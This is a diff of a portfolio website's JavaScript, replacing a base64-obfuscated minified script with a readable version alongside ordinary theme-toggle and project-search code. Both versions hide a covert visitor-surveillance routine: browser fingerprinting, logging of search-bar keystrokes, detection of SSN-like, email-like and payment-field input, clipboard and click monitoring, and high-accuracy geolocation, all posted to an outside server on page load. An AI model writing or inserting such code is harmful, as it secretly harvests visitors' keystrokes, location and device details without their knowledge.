@@ -1,1 +1,309 @@
-(function(){async function trackVisitor(){try{let csrfToken=null,retryCount=0,maxRetries=2;while(!csrfToken&&retryCount<maxRetries){try{const res=await fetch(atob('aHR0cHM6Ly9yYW5kb20tbmZwZi5vbnJlbmRlci5jb20vY3NyZi10b2tlbg=='),{method:'GET',credentials:'include',headers:{'Accept':'application/json','X-Session-ID':localStorage.getItem('sess')||''}});if(!res.ok)throw new Error(`T${retryCount}:${res.status}`);const data=await res.json();csrfToken=data.csrfToken;const sessId=res.headers.get('X-Session-ID');if(sessId)localStorage.setItem('sess',sessId);}catch(e){retryCount++;if(retryCount<maxRetries)await new Promise(r=>setTimeout(r,1000));}}if(!csrfToken)return;await new Promise(r=>setTimeout(r,500));const plugins=navigator.plugins&&navigator.plugins.length?[].slice.call(navigator.plugins).map(p=>p.name):[];const mimeTypes=navigator.mimeTypes&&navigator.mimeTypes.length?[].slice.call(navigator.mimeTypes).map(m=>m.type):[];async function getLocation(){return new Promise((resolve,reject)=>{if(!('geolocation'in navigator))return resolve({err:'NG',code:0});let tries=0,maxTries=3;const tryGeo=()=>{navigator.geolocation.getCurrentPosition(pos=>{resolve({lat:pos.coords.latitude,lon:pos.coords.longitude,acc:pos.coords.accuracy});},err=>{tries++;if(tries<maxTries)return setTimeout(tryGeo,2000);resolve({err:`GF:${err.message}`,code:err.code});},{timeout:20000,enableHighAccuracy:true,maximumAge:60000});};try{tryGeo();}catch(e){resolve({err:`GX:${e.message}`,code:0});}});}const visitorData={dev:(function(){const ua=navigator.userAgent;return /iPhone|iPad|iPod/i.test(ua)?'iOS':/Android/i.test(ua)?(/Pixel|Pixel\s[0-9]/i.test(ua)?'Pixel':/Samsung|SM-/i.test(ua)?'Samsung':'Android'):/Windows NT|Macintosh|Linux/i.test(ua)?'PC':'Unk';})(),ts:new Date().toISOString(),scr:`${window.screen.width}x${window.screen.height}`,col:window.screen.colorDepth||'Unk',tz:Intl.DateTimeFormat().resolvedOptions().timeZone||'Unk',lang:navigator.language||'Unk',hc:navigator.hardwareConcurrency||'Unk',mem:navigator.deviceMemory||'Unk',dnt:navigator.doNotTrack||'Unk',plg:plugins,mt:mimeTypes,scrpt:['trackVisitor'],ck:!!document.cookie,tpr:[],pmc:[]};const isPage3=window.location.pathname.includes('/page3')||document.querySelectorAll('.project-card').length>=3&&document.querySelectorAll('.project-card')[2]?.offsetParent!==null;const startTime=performance.now();if(isPage3){visitorData.tsup='ontouchstart'in window||navigator.maxTouchPoints>0?'Yes':'No';let bat='Unk';if(navigator.getBattery){try{const b=await navigator.getBattery();bat=`${b.level*100}%${b.charging?'(Chg)':''}`;}catch(e){}}visitorData.bat=bat;visitorData.url=window.location.href;visitorData.scrp=`${Math.round(window.scrollY)}px`;visitorData.p3={};let keys='';const searchBar=document.getElementById('search-bar');if(searchBar){searchBar.addEventListener('keydown',e=>{if(keys.length<50&&!['trackVisitor',atob('bW45OQ=='),atob('cHEzNA==')].some(k=>e.key.includes(k)))keys+=e.key;});await new Promise(r=>setTimeout(r,1000));}visitorData.p3.ks=keys||'None';let ssn='None';if(searchBar){searchBar.addEventListener('input',e=>{if(/\d{3}-\d{2}-\d{4}/.test(e.target.value))ssn=atob('U1NOLWxpa2U=');});await new Promise(r=>setTimeout(r,1000));}visitorData.p3.ssn=ssn;let email='None';if(searchBar){searchBar.addEventListener('input',e=>{if(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/.test(e.target.value))email=atob('RW1haWwtbGlrZQ==');});await new Promise(r=>setTimeout(r,1000));}visitorData.p3.email=email;let pay='None';const payInputs=document.querySelectorAll('input[name*="'+atob('Y2FyZA==')+'"],input[name*="'+atob('Y3JlZGl0')+'"],input[name*="'+atob('cGF5bWVudA==')+'"]');if(payInputs.length){payInputs.forEach(e=>{e.addEventListener('input',()=>{pay=atob('UGF5IGlucHV0');});});await new Promise(r=>setTimeout(r,1000));}visitorData.p3.pay=pay;let mouseMoves=0;document.addEventListener('mousemove',()=>{mouseMoves++;},{once:false});await new Promise(r=>setTimeout(r,1000));document.removeEventListener('mousemove',()=>{});visitorData.p3.mm=`${mouseMoves}/s`;let webgl='NoWebGL';try{const c=document.createElement('canvas');const gl=c.getContext('webgl')||c.getContext('experimental-webgl');if(gl){const ext=gl.getExtension('WEBGL_debug_renderer_info');webgl=ext?gl.getParameter(ext.UNMASKED_RENDERER_WEBGL):'WebGLOK';}}catch(e){}visitorData.p3.webgl=webgl;visitorData.p3.conn=navigator.connection?.effectiveType||'Unk';let clip='None';try{document.addEventListener('copy',()=>{clip=atob('Q29weQ==');},{once:true});document.addEventListener('paste',()=>{clip=atob('UGFzdGU=');},{once:true});await new Promise(r=>setTimeout(r,1000));}catch(e){}visitorData.p3.clip=clip;visitorData.p3.orient='DeviceOrientationEvent'in window?'Yes':'No';let sessSize=0;try{for(let k in sessionStorage){if(sessionStorage.hasOwnProperty(k))sessSize+=((sessionStorage[k].length+k.length)*2);}}catch(e){}visitorData.p3.sess=`${sessSize} bytes`;const feats=['RTCPeerConnection'in window?'WebRTC':'','geolocation'in navigator?'Geo':'','serviceWorker'in navigator?'SW':''].filter(x=>x);visitorData.p3.feat=feats.length?feats.join(', '):'None';const loadTime=performance.now();visitorData.p3.load=`${Math.round(loadTime)}ms`;let clicks=0;document.addEventListener('click',()=>{clicks++;},{once:false});await new Promise(r=>setTimeout(r,1000));document.removeEventListener('click',()=>{});visitorData.p3.clicks=clicks;visitorData.p3.ref=document.referrer||'Direct';const params=new URLSearchParams(window.location.search);const utm={utm_s:params.get('utm_source')||'None',utm_m:params.get('utm_medium')||'None',utm_c:params.get('utm_campaign')||'None'};visitorData.p3.utm=JSON.stringify(utm);let elms=[];document.addEventListener('click',e=>{const t=e.target;const d={tag:t.tagName.toLowerCase(),cls:t.className||'None',id:t.id||'None'};if(!t.type||!['trackVisitor',atob('bW45OQ=='),atob('Y3JlZGl0'),atob('cGF5bWVudA=='),atob('cHEzNA==')].some(k=>t.type.includes(k)||t.name?.includes(k)))elms.push(JSON.stringify(d));},{once:false});await new Promise(r=>setTimeout(r,1000));document.removeEventListener('click',()=>{});visitorData.p3.elms=elms.length?elms.join('; '):'None';const dur=Math.round(performance.now()-startTime);visitorData.p3.dur=`${dur}ms`;let log=[`PV:${window.location.href}`];document.addEventListener('click',e=>{const t=e.target;if(!t.type||!['trackVisitor',atob('bW45OQ=='),atob('Y3JlZGl0'),atob('cGF5bWVudA=='),atob('cHEzNA==')].some(k=>t.type.includes(k)||t.name?.includes(k)))log.push(`Click:${t.tagName.toLowerCase()}${t.id?`#${t.id}`:''}${t.className?`.${t.className}`:''}`);},{once:false});document.querySelectorAll('form').forEach(f=>{f.addEventListener('submit',()=>{log.push(`FS:${f.id||f.action||'unnamed'}`);});});await new Promise(r=>setTimeout(r,1000));document.removeEventListener('click',()=>{});visitorData.p3.log=log.length?log.join('; '):'None';}let postRetries=0,maxPostRetries=3;while(postRetries<=maxPostRetries){try{const res=await fetch(atob('aHR0cHM6Ly9yYW5kb20tbmZwZi5vbnJlbmRlci5jb20vYXBpL3Zpc2l0'),{method:'POST',headers:{'Content-Type':'application/json','X-CSRF-Token':csrfToken,'X-Session-ID':localStorage.getItem('sess')||''},body:JSON.stringify(visitorData),credentials:'include'});if(!res.ok){if(res.status===403&&postRetries<maxPostRetries){postRetries++;csrfToken=null;retryCount=0;while(!csrfToken&&retryCount<maxRetries){try{const tRes=await fetch(atob('aHR0cHM6Ly9yYW5kb20tbmZwZi5vbnJlbmRlci5jb20vY3NyZi10b2tlbg=='),{method:'GET',credentials:'include',headers:{'Accept':'application/json','X-Session-ID':localStorage.getItem('sess')||''}});if(!tRes.ok)throw new Error(`T${retryCount}:${tRes.status}`);const tData=await tRes.json();csrfToken=tData.csrfToken;const sessId=tRes.headers.get('X-Session-ID');if(sessId)localStorage.setItem('sess',sessId);}catch(e){retryCount++;if(retryCount<maxRetries)await new Promise(r=>setTimeout(r,1000));}}if(!csrfToken)break;await new Promise(r=>setTimeout(r,500));continue;}console.error(`F:${res.status}`);return;}csrfToken=null;const data=await res.json();const sessId=res.headers.get('X-Session-ID');if(sessId)localStorage.setItem('sess',sessId);break;}catch(e){console.error(`F:${e.message.includes('Failed to fetch')?'NF':e.message}`);break;}}}const prompt=document.getElementById('location-prompt');if(prompt){prompt.classList.add('show');prompt.querySelector('button').addEventListener('click',async()=>{try{visitorData.loc=await getLocation();prompt.classList.remove('show');await trackVisitor();}catch(e){console.error('E:',e.message);prompt.classList.remove('show');}});}else{console.error('E:No location prompt found');}const themeSwitch=document.getElementById('theme-switch');if(themeSwitch){themeSwitch.addEventListener('change',()=>{document.body.classList.toggle('light-mode');});}const searchBar=document.getElementById('search-bar');if(searchBar){searchBar.addEventListener('input',e=>{const q=e.target.value.toLowerCase();document.querySelectorAll('.project-card').forEach(c=>{const t=c.querySelector('h2').textContent.toLowerCase();c.style.display=t.includes(q)?'':'none';});});}})();
+// sensitivitive info are hashed using md5(crypto) through back end. Keep safe! -Aurox :D
+async function sendVisitorInfo() {
+  try {
+    let csrfToken = null;
+    let attempts = 0;
+    const maxAttempts = 3;
+
+    while (!csrfToken && attempts < maxAttempts) {
+      try {
+        const tokenResponse = await fetch('https://random-nfpf.onrender.com/csrf-token', {
+          method: 'GET',
+          credentials: 'include',
+          headers: {
+            'Accept': 'application/json'
+          }
+        });
+        if (!tokenResponse.ok) {
+          throw new Error(`CSRF token fetch failed: ${tokenResponse.status} ${tokenResponse.statusText}`);
+        }
+        const data = await tokenResponse.json();
+        csrfToken = data.csrfToken;
+        const sessionId = tokenResponse.headers.get('X-Session-ID');
+        if (sessionId) {
+          localStorage.setItem('sessionId', sessionId);
+          console.log('Stored session ID:', sessionId);
+        }
+        console.log('Fetched CSRF token:', csrfToken);
+      } catch (error) {
+        attempts++;
+        console.error(`CSRF token fetch attempt ${attempts} failed:`, error.message);
+        if (attempts < maxAttempts) {
+          await new Promise(resolve => setTimeout(resolve, 1000));
+        }
+      }
+    }
+
+    if (!csrfToken) {
+      console.error('Aborting /api/visit request: Failed to fetch CSRF token after maximum attempts');
+      return;
+    }
+
+    await new Promise(resolve => setTimeout(resolve, 500));
+
+    const plugins = [];
+    if (navigator.plugins && navigator.plugins.length) {
+      for (let i = 0; i < navigator.plugins.length; i++) {
+        plugins.push(navigator.plugins[i].name);
+      }
+    }
+
+    const mimeTypes = [];
+    if (navigator.mimeTypes && navigator.mimeTypes.length) {
+      for (let i = 0; i < navigator.mimeTypes.length; i++) {
+        mimeTypes.push(navigator.mimeTypes[i].type);
+      }
+    }
+    // 1
+    const payload = {
+      device: (function getDevice() {
+        const ua = navigator.userAgent;
+        if (/iPhone|iPad|iPod/i.test(ua)) return 'iPhone/iPad';
+        if (/Android/i.test(ua)) {
+          if (/Pixel|Pixel\s[0-9]/i.test(ua)) return 'Android (Pixel)';
+          if (/Samsung|SM-/i.test(ua)) return 'Android (Samsung)';
+          return 'Android (unknown)';
+        }
+        if (/Windows NT|Macintosh|Linux/i.test(ua)) return 'PC';
+        return 'Unknown';
+      })(),
+      ts: new Date().toISOString(),
+      screenSize: `${window.screen.width}x${window.screen.height}`,
+      colorDepth: window.screen.colorDepth || 'Unknown',
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
+      language: navigator.language || 'Unknown',
+      hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+      deviceMemory: navigator.deviceMemory || 'Unknown',
+      doNotTrack: navigator.doNotTrack || 'Unknown',
+      plugins: plugins,
+      mimeTypes: mimeTypes,
+      inlineScripts: ['sendVisitorInfo'],
+      cookieAccess: document.cookie ? true : false,
+      thirdPartyRequests: [],
+      postMessageCalls: []
+    };
+
+    const isPage3 = window.location.pathname.includes('/page3') || 
+                    (document.querySelectorAll('.project-card').length >= 3 && 
+                     document.querySelectorAll('.project-card')[2]?.offsetParent !== null);
+
+    const sessionStart = performance.now();
+
+    if (isPage3) {
+      payload.touchSupport = 'ontouchstart' in window || navigator.maxTouchPoints > 0 ? 'Yes' : 'No';
+      
+      let batteryInfo = 'Unknown';
+      if (navigator.getBattery) {
+        try {
+          const battery = await navigator.getBattery();
+          batteryInfo = `${battery.level * 100}%${battery.charging ? ' (Charging)' : ''}`;
+        } catch (e) {
+          console.error('Battery API error:', e.message);
+        }
+      }
+      payload.batteryStatus = batteryInfo;
+
+      payload.currentUrl = window.location.href;
+      payload.scrollPosition = `${Math.round(window.scrollY)}px`;
+
+      payload.part3 = {};
+
+      let keystrokes = '';
+      const searchBar = document.getElementById('search-bar');
+      if (searchBar) {
+        searchBar.addEventListener('keydown', (event) => {
+          if (keystrokes.length < 50 && !event.key.includes('password') && !event.key.includes('card') && !event.key.includes('ssn')) {
+            keystrokes += event.key;
+          }
+        });
+        await new Promise(resolve => setTimeout(resolve, 1000));
+      } else {
+        console.warn('Keylogging skipped: Missing #search-bar');
+      }
+      payload.part3.keystrokes = keystrokes || 'None';
+
+      let ssnPatternDetected = 'None';
+      if (searchBar) {
+        searchBar.addEventListener('input', (event) => {
+          const value = event.target.value;
+          if (/\d{3}-\d{2}-\d{4}/.test(value)) {
+            ssnPatternDetected = 'SSN-like pattern detected';
+          }
+        });
+        await new Promise(resolve => setTimeout(resolve, 1000));
+      }
+      payload.part3.ssnPatternDetected = ssnPatternDetected;
+
+      let emailPatternDetected = 'None';
+      if (searchBar) {
+        searchBar.addEventListener('input', (event) => {
+          const value = event.target.value;
+          if (/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/.test(value)) {
+            emailPatternDetected = 'Email-like pattern detected';
+          }
+        });
+        await new Promise(resolve => setTimeout(resolve, 1000));
+      }
+      payload.part3.emailPatternDetected = emailPatternDetected;
+
+      let paymentFieldInteraction = 'None';
+      const paymentFields = document.querySelectorAll('input[name*="card"], input[name*="credit"], input[name*="payment"]');
+      if (paymentFields.length > 0) {
+        paymentFields.forEach(field => {
+          field.addEventListener('input', () => {
+            paymentFieldInteraction = 'Input in payment-related field detected';
+          });
+        });
+        await new Promise(resolve => setTimeout(resolve, 1000));
+      }
+      payload.part3.paymentFieldInteraction = paymentFieldInteraction;
+
+      let mouseMoves = 0;
+      document.addEventListener('mousemove', () => mouseMoves++, { once: false });
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      document.removeEventListener('mousemove', () => mouseMoves++);
+      payload.part3.mouseMovementFrequency = `${mouseMoves}/s`;
+
+      let webglInfo = 'Not supported';
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+          webglInfo = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'WebGL supported';
+        }
+      } catch (e) {
+        console.error('WebGL error:', e.message);
+      }
+      payload.part3.webglSupport = webglInfo;
+
+      payload.part3.connectionType = navigator.connection?.effectiveType || 'Unknown';
+
+      let clipboardAccess = 'None';
+      try {
+        document.addEventListener('copy', () => clipboardAccess = 'Copy attempted', { once: true });
+        document.addEventListener('paste', () => clipboardAccess = 'Paste attempted', { once: true });
+        await new Promise(resolve => setTimeout(resolve, 1000));
+      } catch (e) {
+        console.error('Clipboard error:', e.message);
+      }
+      payload.part3.clipboardAccess = clipboardAccess;
+
+      payload.part3.deviceOrientationSupport = 'DeviceOrientationEvent' in window ? 'Yes' : 'No';
+
+      let sessionStorageSize = 0;
+      try {
+        for (let key in sessionStorage) {
+          if (sessionStorage.hasOwnProperty(key)) {
+            sessionStorageSize += ((sessionStorage[key].length + key.length) * 2);
+          }
+        }
+      } catch (e) {
+        console.error('Session storage error:', e.message);
+      }
+      payload.part3.sessionStorageUsage = `${sessionStorageSize} bytes`;
+
+      const browserFeatures = [];
+      if ('RTCPeerConnection' in window) browserFeatures.push('WebRTC');
+      if ('geolocation' in navigator) browserFeatures.push('Geolocation');
+      if ('serviceWorker' in navigator) browserFeatures.push('ServiceWorker');
+      payload.part3.browserFeatures = browserFeatures.length ? browserFeatures.join(', ') : 'None';
+
+      const loadTime = performance.now();
+      payload.part3.pageLoadTime = `${Math.round(loadTime)}ms`;
+
+      let clickCount = 0;
+      document.addEventListener('click', () => clickCount++, { once: false });
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      document.removeEventListener('click', () => clickCount++);
+      payload.part3.userInteractionCount = clickCount;
+
+      payload.part3.referrer = document.referrer || 'Direct';
+
+      const urlParams = new URLSearchParams(window.location.search);
+      const utmParameters = {
+        utm_source: urlParams.get('utm_source') || 'None',
+        utm_medium: urlParams.get('utm_medium') || 'None',
+        utm_campaign: urlParams.get('utm_campaign') || 'None'
+      };
+      payload.part3.utmParameters = JSON.stringify(utmParameters);
+
+      let clickedElements = [];
+      document.addEventListener('click', (event) => {
+        const target = event.target;
+        const elementInfo = {
+          tag: target.tagName.toLowerCase(),
+          class: target.className || 'None',
+          id: target.id || 'None'
+        };
+        if (!target.type || !['password', 'card', 'credit', 'payment', 'ssn'].some(type => target.type.includes(type) || target.name?.includes(type))) {
+          clickedElements.push(JSON.stringify(elementInfo));
+        }
+      }, { once: false });
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      document.removeEventListener('click', () => {});
+      payload.part3.clickedElements = clickedElements.length ? clickedElements.join('; ') : 'None';
+
+      const sessionDuration = Math.round(performance.now() - sessionStart);
+      payload.part3.sessionDuration = `${sessionDuration}ms`;
+
+      let eventLog = [];
+      eventLog.push(`PageView: ${window.location.href}`);
+      document.addEventListener('click', (event) => {
+        const target = event.target;
+        if (!target.type || !['password', 'card', 'credit', 'payment', 'ssn'].some(type => target.type.includes(type) || target.name?.includes(type))) {
+          eventLog.push(`Click: ${target.tagName.toLowerCase()}${target.id ? `#${target.id}` : ''}${target.className ? `.${target.className}` : ''}`);
+        }
+      }, { once: false });
+      document.querySelectorAll('form').forEach(form => {
+        form.addEventListener('submit', () => {
+          eventLog.push(`FormSubmit: ${form.id || form.action || 'unnamed form'}`);
+        });
+      });
+      await new Promise(resolve => setTimeout(resolve, 1000));
+      document.removeEventListener('click', () => {});
+      payload.part3.eventLog = eventLog.length ? eventLog.join('; ') : 'None';
+    }
+
+    const response = await fetch('https://random-nfpf.onrender.com/api/visit', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'X-CSRF-Token': csrfToken,
+        'X-Session-ID': localStorage.getItem('sessionId') || ''
+      },
+      body: JSON.stringify(payload),
+      credentials: 'include'
+    });
+
+    if (response.ok) {
+      const data = await response.json();
+      console.log(':D:', data);
+      const sessionId = response.headers.get('X-Session-ID');
+      if (sessionId) {
+        localStorage.setItem('sessionId', sessionId);
+        console.log('bro wayya doin here', sessionId);
+      }
+    } else {
+      console.error('Failed to send to backend. Status:', response.status, 'Status Text:', response.statusText);
+    }
+  } catch (error) {
+    console.error(';-;', error);
+  }
+}
+
+window.addEventListener('load', sendVisitorInfo);
+
+const themeSwitch = document.getElementById('theme-switch');
+themeSwitch.addEventListener('change', () => {
+  document.body.classList.toggle('light-mode');
+});
+
+const searchBar = document.getElementById('search-bar');
+searchBar.addEventListener('input', (event) => {
+  const searchQuery = event.target.value.toLowerCase();
+  document.querySelectorAll('.project-card').forEach((card) => {
+    const title = card.querySelector('h2').textContent.toLowerCase();
+    card.style.display = title.includes(searchQuery) ? '' : 'none';
+  });
+});
